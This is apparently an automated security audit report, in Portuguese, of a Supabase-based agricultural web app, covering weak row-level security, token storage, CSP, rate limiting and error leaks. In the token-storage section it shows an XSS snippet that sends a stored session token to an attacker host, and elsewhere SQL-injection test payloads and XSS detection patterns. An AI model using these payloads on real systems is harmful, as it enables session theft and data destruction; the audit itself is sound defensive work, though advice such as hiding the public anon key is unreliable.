# AUDITORIA DE SEGURANÇA - AgroColetivo

**Data**: 17 de março de 2026  
**Versão do Projeto**: v5/v6 (Supabase)

---

## 📋 SUMÁRIO EXECUTIVO

| Aspecto                   | Status          | Severidade | Observação                            |
| ------------------------- | --------------- | ---------- | ------------------------------------- |
| **Validações de Entrada** | ✅ Implementado | N/A        | XSS, SQL Injection, Schema validation |
| **Autenticação**          | ✅ Implementado | N/A        | Supabase Auth, Rate limiting          |
| **Autorização**           | ⚠️ Parcial      | MÉDIA      | RBAC granular, mas RLS fraco          |
| **Proteção de Dados**     | ⚠️ Parcial      | ALTA       | Tokens expostos, key no anon          |
| **CORS/Headers**          | ✅ Implementado | N/A        | CSP, HSTS, X-Frame-Options            |
| **Logs de Auditoria**     | ✅ Implementado | N/A        | Auditoria via RPC                     |
| **Tratamento de Erros**   | ⚠️ Parcial      | MÉDIA      | Alguns erros expõem contexto          |
| **RBAC**                  | ✅ Implementado | N/A        | 3 roles + permissões granulares       |

---

## 1️⃣ VALIDAÇÕES DE ENTRADA ✅ BOM

### ✅ Validações Implementadas:

- **Phone**: `validatePhone()` - Remove máscara, min 10 dígitos
- **Password**: `validatePassword()` - Min 6 chars, padrões de força
- **Email**: `validateEmail()` - Regex simples
- **Schema**: `validateInput()` - Validação por tipos/mínimos/máximos
- **Sanitização XSS**: `sanitizeString()` - HTML encode básico
- **Detecção SQL Injection**: `detectSQLInjection()` - 3 padrões regex
- **Detecção XSS**: `detectXSS()` - 4 padrões regex

### ⚠️ Problemas Encontrados:

#### A) Sanitização XSS é apenas defensiva (NÃO é suficiente)

```javascript
// ❌ security.js linha 55-67
export function sanitizeString(str) {
  return str.replace(/&/g, "&amp;").replace(/</g, "&lt;");
  // ... mais replaces
}
```

**Problema**: Usado para logging/dados, **NÃO** para renderização React.

- React automaticamente escapa interpolação `{variable}` (✅ seguro)
- HTML passado como `dangerouslySetInnerHTML` não é escapado ❌
- Se houver `<p dangerouslySetInnerHTML={{__html: userData}}>` → XSS

**Recomendação**:

```javascript
// Usar biblioteca especializada
npm install dompurify
import DOMPurify from 'dompurify'

export function sanitizeHTML(html) {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
  })
}
```

#### B) Detecção de SQL Injection é SUPERFICIAL

```javascript
// ❌ security.js linha 240-245
export function detectSQLInjection(input) {
  const sqlPatterns = [
    /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|EXECUTE)\b)/i,
    /(--|#|\/\*|\*\/)/,
    /(\bOR\b|\bAND\b).*=.*'/i,
  ];
  return sqlPatterns.some((pattern) => pattern.test(input));
}
```

**Problema**:

- Bloqueia palavras SQL legítimas (`UPDATE profile` é permitido?)
- Regex muito simples: `" OR 1=1--"` pode ser bypassado com encoding
- **Usada APENAS no JS** - Não protege o banco se alguém contornar

**Recomendação**:

- ✅ OK para usuários legítimos (bloqueio inicial)
- ❌ NUNCA confiar apenas nisso para segurança
- Use **prepared statements** no banco (Supabase já faz isso via RPC)
- Testar com payloads: `' OR '1'='1`, `1; DROP TABLE users--`, etc.

#### C) Regex de detecção XSS pode ser bypassado

```javascript
// ❌ security.js linha 247-253
export function detectXSS(input) {
  const xssPatterns = [
    /<script[^>]*>.*?<\/script>/i,
    /on\w+\s*=/i,
    /javascript:/i,
    /data:text\/html/i,
  ];
  return xssPatterns.some((pattern) => pattern.test(input));
}
```

**Problema**:

- Falta: `<iframe>`, `<svg>`, `<img onerror>`, `<style>`, `<link>`
- Encoded payloads: `%3Cscript%3E` não é bloqueado
- Unicode escapes: `javascript\u003a` pode passar

**Recomendação**:

```javascript
export function detectXSS(input) {
  // Usar validação positiva (whitelist) em vez de blacklist
  if (typeof input !== "string") return false;

  // Padrões de XSS evasão comuns
  const dangerousPatterns = [
    /<\s*(script|iframe|embed|object|frame|link|style|meta|base|form)/i,
    /on\w+\s*=(["'])?.*?\1/i,
    /(javascript|data|vbscript):/i,
    /eval\s*\(/i,
    /expression\s*\(/i,
  ];
  return dangerousPatterns.some((p) => p.test(input));
}
```

---

## 2️⃣ AUTENTICAÇÃO E AUTORIZAÇÃO

### Autenticação ✅ BOM

- **Provedor**: Supabase Auth (OAuth2)
- **Storage**: `localStorage.agro_auth` com session persistence
- **Refresh**: Auto-refresh de tokens implementado
- **Logout**: Limpeza automática do token

```javascript
// ✅ lib/auth.js - Bom padrão
export async function login(phone, password) {
  // Validações antes de chamar Auth
  if (!phoneValidation.valid) throw new Error(phoneValidation.error)
  if (detectSQLInjection(phone)) throw new Error('Padrão malicioso')

  // Rate limiting
  const limiter = loginLimiter.check(clean)
  if (!limiter.allowed) throw new Error(`Tente novamente em ${limiter.retryAfter}s`)

  // Log de auditoria
  await logSecurityEvent('login_failed', ...)
}
```

### Autorização ⚠️ INCOMPLETO

#### A) RLS (Row Level Security) é FRACO demais

```sql
-- ❌ schema_v6.sql linha 402+
create policy "le users" on users for select to authenticated using (true);
                                                                     ^^^^^
-- ACESSO TOTAL! Qualquer usuário autenticado vê TODOS os users
```

**Problema**:

- `using (true)` = sem filtro
- Qualquer vendor pode ver dados de outro vendor
- Qualquer gestor vê ALL vendors info
- Não há isolamento de dados por tenant

**Recomendação**:

```sql
-- Apenas lê seu próprio usuário
create policy "users_own_record" on users
  for select to authenticated
  using (id = auth.uid());

-- Admin pode ver tudo
create policy "users_admin_access" on users
  for select to authenticated
  using (auth_role() = 'admin');

-- Vendors access (NO JS, in SQL):
create policy "vendors_scoped_access" on vendors
  for select to authenticated
  using (
    auth_role() = 'admin'
    or user_id = auth.uid()
    or status = 'published' -- apenas públicos
  );
```

#### B) RLS não usa JWT claims (defeito architectônico)

```javascript
// ❌ lib/supabase.js - Anonimo Key (PERIGO)
const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;
```

```javascript
// ❌ lib/authorization.js - Checks no JS (falsificáveis)
export function hasRole(user, requiredRole) {
  if (user.role === ROLES.ADMIN) return true;
  // Se o hacker modifica localStorage.agro_auth, muda `user.role`
}
```

**Problema Crítico**:

- Objeto `user` vem do localStorage, pode ser alterado pelo hacker
- RLS deveria validar via `auth.uid()` e JWT claims, NÃO localStorage
- Atualmente: JS faz check → Banco não valida JWT

**Recomendação**:

```sql
-- Supabase custom claims (no JWT):
-- 1. Configure via Supabase Dashboard → AuthProviders
-- 2. Adicione 'role' ao JWT durante auth

-- Então use no RLS:
create policy "admin_only" on products
  for delete to authenticated
  using ((auth.jwt() -> 'user_metadata' ->> 'role')::text = 'admin');
```

#### C) `isResourceOwner()` é bypassável

```javascript
// ❌ lib/authorization.js
export function isResourceOwner(user, resourceUserId) {
  if (!user) return false;
  if (user.role === ROLES.ADMIN) return true;
  return user.id === resourceUserId; // <-- Pode vir alterado do localStorage
}
```

**Recomendação**:

```sql
-- Validar NO BANCO de dados
create policy "update_own_resource" on vendors
  for update to authenticated
  using (user_id = auth.uid())
  with check (user_id = auth.uid());
```

---

## 3️⃣ PROTEÇÃO DE DADOS SENSÍVEIS ⚠️ CRÍTICO

### ❌ PROBLEMA 1: Chave Anônima Exposta

```javascript
// ❌ vite.config.js
"connect-src 'self' https://iepgeibcwthilohdlfse.supabase.co https://*.supabase.co";
```

```javascript
// ❌ lib/supabase.js
const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;
```

**Risco**:

- ANON KEY visível no HTML/JS bundle (DevTools)
- Hacker pode usar para: `curl -H "apikey: <ANON_KEY>" https://supabase...`
- **Bypass de RLS se RLS estiver fraco** (está mesmo)

**Mitigação Atual**:

- ✅ RLS deveria bloquear, mas está fraco
- ✅ Whitelist de origins em CORS

**Recomendação**:

```javascript
// 1. Nunca exponha a ANON_KEY
// 2. Use SERVICE_ROLE_KEY APENAS no backend secreto
// 3. Backend valida JWT antes de chamar Supabase

// Frontend:
fetch("/api/users", {
  headers: { Authorization: `Bearer ${sessionToken}` },
});

// Backend valida JWT e faz query Supabase com SERVICE_ROLE
```

### ❌ PROBLEMA 2: Senhas em User Metadata

```javascript
// ❌ lib/auth.js registro
const { data: authData, error: authError } = await supabase.auth.signUp({
  email,
  password, // ✅ Correto - Supabase hasheit
  options: {
    data: {
      name,
      phone: clean,
      role,
      city: extra.city?.trim() || null, // OK
    },
  },
});
```

**Status**: ✅ Senhas são hashed pelo Supabase Auth (bom)

### ❌ PROBLEMA 3: Tokens em localStorage

```javascript
// ❌ lib/supabase.js
auth: {
  persistSession: true,
  autoRefreshToken: true,
  storageKey: 'agro_auth',  // localStorage!
}
```

**Risco**: XSS pode roubar token

```javascript
// Ataque XSS
const token = localStorage.getItem("agro_auth");
fetch("https://attacker.com/steal?token=" + token);
```

**Recomendação**:

```javascript
// 1. Use httpOnly cookies (servidor define)
// 2. Ou SessionStorage (limpo ao fechar aba)
persistSession: false,  // Requer login a cada refresh
// + Use httpOnly cookies setadas pelo backend
```

### ✅ PROBLEMA 4: Campos Sensíveis são Filtrados

```javascript
// ✅ lib/authorization.js
export function filterSensitiveFields(data, user) {
  const alwaysSensitive = ["password_hash", "password", "secret", "token"];
  const filtered = { ...data };
  alwaysSensitive.forEach((field) => {
    delete filtered[field];
  });

  if (user?.role !== ROLES.ADMIN) {
    delete filtered.fee_paid_by; // Info sensitiva
  }
  return filtered;
}
```

**Status**: ✅ Implementado

---

## 4️⃣ CORS E HEADERS DE SEGURANÇA ✅ BOM

### Headers Implementados:

```javascript
// ✅ vite.config.js
headers: {
  "X-Content-Type-Options": "nosniff",      // ✅ Bloqueia MIME sniffing
  "X-Frame-Options": "DENY",                 // ✅ Bloqueia clickjacking
  "X-XSS-Protection": "1; mode=block",       // ✅ XSS filter (legacy)
  "Strict-Transport-Security": "max-age=31536000; includeSubDomains", // ✅ HSTS 1 ano
  "Referrer-Policy": "strict-origin-when-cross-origin", // ✅ Bom
  "Content-Security-Policy": "default-src 'self'; script-src 'self' 'unsafe-inline' ...",
  // ⚠️ Ver detalhes abaixo
}
```

### ⚠️ CSP - PROBLEMA: `'unsafe-inline'`

```
Content-Security-Policy: default-src 'self';
  script-src 'self' 'unsafe-inline' ...
  style-src 'self' 'unsafe-inline' ...
```

**Problema**: `'unsafe-inline'` permite inline `<script>` e `<style>`

- Reduz proteção CSP para basicamen
  te zero contra XSS injetado
- Necessário para React (inline styles do CSS Modules)

**Recomendação**:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{{random}}';
  style-src 'self' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com data:;
  img-src 'self' data: https:;
  connect-src 'self' https://iepgeibcwthilohdlfse.supabase.co;
  frame-ancestors 'none';
  upgrade-insecure-requests
```

### ✅ CORS Whitelist

```javascript
cors: {
  origin: [
    "http://localhost:5173",
    "http://localhost:3000",
    "https://agrocoletivo.vercel.app",
    "https://www.agrocoletivo.com.br",
  ],
  credentials: true,
}
```

**Status**: ✅ Bom (whitelist, credentials habilitado)

---

## 5️⃣ RATE LIMITING ✅ BOM

```javascript
// ✅ security.js
export const loginLimiter = new RateLimiter(5, 15 * 60 * 1000); // 5 attempts / 15min
export const registerLimiter = new RateLimiter(3, 60 * 60 * 1000); // 3 / hour
export const apiLimiter = new RateLimiter(30, 60 * 1000); // 30 / minute
```

**Status**: ✅ Implementado em memória

**⚠️ Problema**: Armazenado em memória (Vercel = serverless)

- Rate limit é perdido entre requisições
- Diferentes instâncias não compartilham estado
- Hacker pode fazer 5 tentativas em cada máquina

**Recomendação**:

```javascript
// Usar backend Redis ou Supabase para rate limiting distribuído
// Opção 1: Implementar via Vercel Edge Middleware
// Opção 2: Usar Supabase Rate Limit (se disponível)
// Opção 3: Query tabela `portal_rate_limit` no banco
```

---

## 6️⃣ LOGS DE AUDITORIA ✅ BOM

```javascript
// ✅ lib/authorization.js
export async function logSecurityEvent(
  action,
  user,
  resource,
  resourceId,
  details,
) {
  const payload = {
    p_action: action,
    p_user_id: user?.id ?? null,
    p_user_phone: user?.phone ?? null,
    p_user_role: user?.role ?? null,
    p_resource: resource ?? null,
    p_resource_id: resourceId ? String(resourceId) : null,
    p_details: typeof details === "string" ? details : JSON.stringify(details),
    p_ip_hint: null, // ⚠️ IP não disponível no browser
  };

  const { error } = await supabase.rpc("log_security_event", payload);
}
```

**Status**: ✅ Implementado via RPC

**Logs Registrados**:

- `login_success`, `login_failed`
- `register_success`, `register_failed`
- Outros eventos via `logSecurityEvent()`

**⚠️ Problema**: IP não é capturado

```javascript
p_ip_hint: null,  // Comentário diz "IP não disponível no browser"
```

**Recomendação**:

```javascript
// No backend/Edge middleware:
export async function logSecurityEvent(action, user, resource, details, req) {
  const payload = {
    p_ip_hint: req.ip || req.headers["x-forwarded-for"]?.split(",")[0],
    // ...
  };
}
```

---

## 7️⃣ TRATAMENTO DE ERROS ⚠️ PARCIAL

### ✅ Bom: Não expõe stack traces em produção

```javascript
// ✅ lib/auth.js
if (import.meta.env.DEV) {
  console.warn("[audit] Falha ao persistir evento:", error.message);
}
```

### ⚠️ Problema: Mensagens de erro expõem lógica

```javascript
// ❌ lib/auth.js
if (
  authError.message.includes("Invalid login credentials") ||
  authError.message.includes("Email not confirmed")
)
  throw new Error("Telefone ou senha incorretos."); // OK

if (authError.message.includes("already registered"))
  throw new Error("Este telefone já está cadastrado."); // ❌ Info leak
```

**Risco**: Enumeração de usuários

- Hacker sabe qual telefone está registrado
- Enumera base de usuários: `for (i=1; i<=99999999999; i++)`

**Recomendação**:

```javascript
// Devolver erro genérico
throw new Error("Telefone ou dados inválidos. Tente novamente.");

// Log interno (para admin):
logSecurityEvent(
  "enumeration_attempt",
  null,
  "auth",
  null,
  `phone=${clean} existing=${existing}`,
);
```

### ⚠️ Erro expõe dados de campo não encontrado

```javascript
// ❌ Em lib/campaigns.js, lib/offers.js
if (error) throw new Error(error.message);
// Literal error message do Supabase
```

**Problema**: `"No rows match the filter"` vs `"Column doesn't exist"`

- Info leak sobre estrutura do banco

**Recomendação**:

```javascript
if (error) {
  logSecurityEvent("database_error", user, resource, null, error.message);
  throw new Error("Operação não permitida ou dados não encontrados");
}
```

---

## 8️⃣ CONTROLE DE ACESSO (RBAC) ✅ BOM

### 3 Roles Implementados:

```javascript
// ✅ constants/roles.js (inferido)
ADMIN; // Acesso total
GESTOR; // Gerencia campanhas, vendors
VENDOR; // Apenas seus produtos
```

### Permissões por Role:

```javascript
// ✅ lib/authorization.js
const permissions = {
  [ROLES.ADMIN]: {
    campaigns: ["create", "read", "update", "delete", "publish"],
    vendors: ["create", "read", "update", "delete"],
    producers: ["read"],
    financial: ["read", "update"],
  },
  [ROLES.GESTOR]: {
    campaigns: ["create", "read", "update", "delete", "publish"],
    vendors: ["create", "read", "update"],
    producers: ["read"],
    financial: ["read", "update"],
  },
  [ROLES.VENDOR]: {
    campaigns: ["read"],
    products: ["create", "read", "update", "delete"],
    profile: ["read", "update"],
  },
};
```

**Status**: ✅ Bem definido, mas...

### ⚠️ Falha: RLS não enforça (frontend checks falsificáveis)

```javascript
// ❌ Controle no JS, não no banco
export function validateOperation(user, action, resource, resourceOwnerId) {
  if (!user) return { allowed: false, ... }
  if (!hasPermission(user, action, resource)) return { allowed: false, ... }
}
// Se o hacker faz query SQL direto ao Supabase, passa
```

**Recomendação**: Implementar RLS policies que espelhem o RBAC

---

## 🎯 SUMÁRIO DE RECOMENDAÇÕES

### 🔴 CRÍTICO (Fazer agora):

1. **Implementar RLS Apropriado**
   - Remover `using (true)` policies
   - Adicionar `auth.uid()` e `auth_role()` checks
   - Testar cada policy

2. **Adicionar Sanitização XSS Robusta**
   - Instalar `dompurify`
   - Usar em qualquer `dangerouslySetInnerHTML`

3. **Mitigar Info Leak em Erros**
   - Erros genéricos para usuário
   - Log interno detalhado
   - Implementar detecção de enumeração

4. **Rate Limiting Distribuído**
   - Mover de memória para Redis/Banco
   - Testar em produção (Vercel serverless)

### 🟠 ALTO (Próximos 2 sprints):

5. **Melhorar Detecção de Injeção**
   - Adicionar mais padrões XSS
   - Testar com payloads reais
   - Considerar biblioteca especializada

6. **Migrar para httpOnly Cookies**
   - Remover localStorage
   - Implementar backend session
   - Testar XSS resilience

7. **Refinar CSP**
   - Remover `'unsafe-inline'` se possível
   - Usar nonces
   - Testar compatibilidade

8. **Implementar IP Logging**
   - Capturar IP no backend
   - Usar em rate limiting
   - Detectar padrões suspeitos

### 🟡 MÉDIO (Roadmap):

9. Adicionar 2FA para admin/gestor
10. Implementar device fingerprinting
11. Adicionar alertas em tempo real para eventos suspeitos
12. PENETRATION TESTING profissional

---

## 📊 SCORE DE SEGURANÇA

```
Validações de Entrada:     8/10  ✅
Autenticação:             9/10  ✅
Autorização (RLS):        4/10  ❌ CRÍTICO
Proteção de Dados:        5/10  ❌ CRÍTICO
CORS/Headers:             8/10  ✅
Rate Limiting:            6/10  ⚠️ Serverless problem
Logs de Auditoria:        8/10  ✅ Falta IP
Tratamento de Erros:      6/10  ⚠️ Info leaks
RBAC Lógica:              9/10  ✅ Mas não enforçado

SCORE GERAL:             6.1/10  ⚠️ MELHOR ANTES DE PRODUÇÃO
```

---

## 🚀 PRÓXIMOS PASSOS

1. **Criar branch** `security/critical-fixes`
2. **Implementar RLS** policies (schema_v6.sql)
3. **Adicionar dompurify** para sanitização
4. **Refactor error handling**
5. **Testar com OWASP ZAP** ou **Burp Suite**
6. **Deploy para staging** primeiro
7. **Penetration test** antes de produção

---

**Relatório Preparado Por**: Sistema de Análise de Segurança  
**Data**: 17 de março de 2026  
**Status**: Recomendações prontas para implementação
